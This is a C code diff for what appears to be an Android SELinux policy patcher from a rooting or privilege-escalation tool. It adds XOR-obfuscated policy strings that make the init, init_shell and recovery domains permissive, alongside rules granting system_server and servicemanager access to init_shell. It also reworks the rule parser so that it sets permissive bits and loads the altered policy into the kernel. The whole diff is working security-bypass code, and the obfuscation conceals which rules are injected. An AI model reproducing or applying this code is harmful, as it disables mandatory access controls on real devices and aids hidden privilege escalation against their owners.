@@ -20,7 +20,10 @@
 
 unsigned char obf_policy[] = "\x8f\xaa\x2c\xe0\x0c\x3e\x03\x20\x27\x3a\x3c\x0a"; // "/sepolicy"
 char pol_list[][POLSIZE] = {
-
+  
+  "\x14\x6e\x75\xbc\xb1\xba\x89\x85\xbb\xbb\x85\xbe\xb1\xf2\x85\x86\x85\xa0", // "permissive:init"
+  "\x58\x04\x49\x28\x45\x2a\x3d\x31\x2b\x2b\x31\x36\x45\x62\x31\x3e\x31\x34\x0f\x2b\x30\x45\x3c\x3c", // "permissive:init_shell"
+  "\x0c\xc0\xdf\xfc\xe9\xfe\xe1\xe5\xff\xff\xe5\xfa\xe9\x36\xfe\xe9\xef\xe3\xfa\xe9\xfe\xf5", // "permissive:recovery"
   "\xae\xc0\x47\x4f\x42\x42\x41\x59\x94\x5d\x4b\x5c\x58\x47\x4d\x4b\x43\x4f\x40\x4f\x49\x4b\x5c\x94\x47\x40\x47\x5a\x71\x5d\x46\x4b\x42\x42\x94\x48\x47\x42\x4b\x94\x41\x5e\x4b\x40", // "allow:servicemanager:init_shell:file:open"
   "\x07\xe9\xc0\xa6\xbd\xbd\xb8\xb0\xcf\xb4\x8e\xb4\xb5\xa2\xba\xa8\xb4\xa2\xb7\xb3\xa2\xb7\xcf\xbe\xbb\xbe\xb5\xa8\xb4\xb1\xa2\xbd\xbd\xcf\xa7\xbe\xbb\xa5\xa2\xb7\xcf\xb5\xb7\xa6\xbb\xb4\xa3\xa2\xb7", // "allow:system_server:init_shell:binder:transfer"
   "\x69\x98\xde\x38\x05\x05\x06\x2e\x73\x2a\x3c\x2b\x2f\x00\x3a\x3c\x04\x38\x07\x38\x3e\x3c\x2b\x73\x00\x07\x00\x2d\x56\x2a\x01\x3c\x05\x05\x73\x29\x2b\x06\x3a\x3c\x2a\x2a\x73\x3e\x3c\x2d\x38\x2d\x2d\x2b", // "allow:servicemanager:init_shell:process:getattr"
@@ -963,7 +966,6 @@ int load_policy_into_kernel(policydb_t *policydb) {
 
 int parse_add_rules(void) {
   char *policy = deobfuscate(obf_policy); 
-  char *permissive = NULL;
   
   policydb_t policydb;
   struct policy_file pf, outpf;
@@ -1002,6 +1004,22 @@ int parse_add_rules(void) {
       continue;
     }
 
+    if(!strcmp(req,"permissive")) {
+      type_datum_t *type;
+      type = hashtab_search(policydb.p_types.table, source);
+      if (type == NULL) {
+	LOGD("type %s does not exist\n", source);
+	continue;
+      }
+      if (ebitmap_set_bit(&policydb.permissive_map, type->s.value, 1)) {
+	LOGD("Could not set bit in permissive map\n");
+	continue;
+      }
+
+      LOGD("Permissive Done\n");
+      continue;
+    }
+    
     char *target = strtok(NULL, ":");
     if(target == NULL) {
       LOGD("No target\n");
@@ -1020,26 +1038,13 @@ int parse_add_rules(void) {
       continue;
     }
 
-    if ((!source || !target || !class || !perm) && !permissive)
+    if ((!source || !target || !class || !perm))
       continue;
-    
-    if (permissive) {
-      type_datum_t *type;
-      type = hashtab_search(policydb.p_types.table, permissive);
-      if (type == NULL) {
-	LOGD("type %s does not exist\n", permissive);
-	continue;
-      }
-      if (ebitmap_set_bit(&policydb.permissive_map, type->s.value, 1)) {
-	LOGD("Could not set bit in permissive map\n");
-	continue;
-      }
-    } else {
-      int ret_add_rule;
-      if (ret_add_rule = add_rule(source, target, class, perm, &policydb)) {
-	LOGD("Could not add rule\n");
-	continue;
-      }
+
+    int ret_add_rule;
+    if (ret_add_rule = add_rule(source, target, class, perm, &policydb)) {
+      LOGD("Could not add rule\n");
+      continue;
     }
   }
   if (load_policy_into_kernel(&policydb)) {
